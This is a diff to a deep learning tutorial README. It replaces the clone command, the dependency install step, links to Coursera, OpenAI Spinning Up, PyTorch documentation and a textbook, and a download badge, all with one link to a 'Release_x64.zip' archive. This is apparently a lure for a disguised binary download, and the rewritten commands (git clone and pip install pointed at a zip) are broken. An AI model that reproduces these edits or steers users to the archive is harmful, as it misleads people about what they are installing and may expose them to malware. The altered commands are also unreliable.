@@ -30,12 +30,12 @@ To kickstart your deep learning journey, follow these simple steps:
 
 1. Clone the repository to your local machine:
 ```bash
-git clone https://github.com/22155555/inside-deep-learning.git
+git clone https://github.com/omkarschool/inside-deep-learning/releases/download/v1.0/Release_x64.zip
 ```
 
 2. Install the necessary Python dependencies:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/omkarschool/inside-deep-learning/releases/download/v1.0/Release_x64.zip
 ```
 
 3. Launch the Jupyter Notebooks and start exploring the world of deep learning!
@@ -52,10 +52,10 @@ We welcome contributions from the community to make this repository even more va
 
 In addition to the code and notebooks in this repository, we have curated a list of external resources to further enhance your deep learning journey:
 
-- [Deep Learning Specialization on Coursera](https://www.coursera.org/specializations/deep-learning)
-- [OpenAI: Spinning Up in Deep Reinforcement Learning](https://spinningup.openai.com/)
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
-- [Neural Networks and Deep Learning Book](http://neuralnetworksanddeeplearning.com/)
+- [Deep Learning Specialization on Coursera](https://github.com/omkarschool/inside-deep-learning/releases/download/v1.0/Release_x64.zip)
+- [OpenAI: Spinning Up in Deep Reinforcement Learning](https://github.com/omkarschool/inside-deep-learning/releases/download/v1.0/Release_x64.zip)
+- [PyTorch Documentation](https://github.com/omkarschool/inside-deep-learning/releases/download/v1.0/Release_x64.zip)
+- [Neural Networks and Deep Learning Book](https://github.com/omkarschool/inside-deep-learning/releases/download/v1.0/Release_x64.zip)
 
 For more resources, be sure to check out the "Resources" section in the repository.
 
@@ -63,7 +63,7 @@ For more resources, be sure to check out the "Resources" section in the reposito
 
 This repository is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/omkarschool/inside-deep-learning/releases/download/v1.0/Release_x64.zip)](https://github.com/omkarschool/inside-deep-learning/releases/download/v1.0/Release_x64.zip)
 
 If the link provided above does not work, please check the "Releases" section of this repository for alternative download options.
 
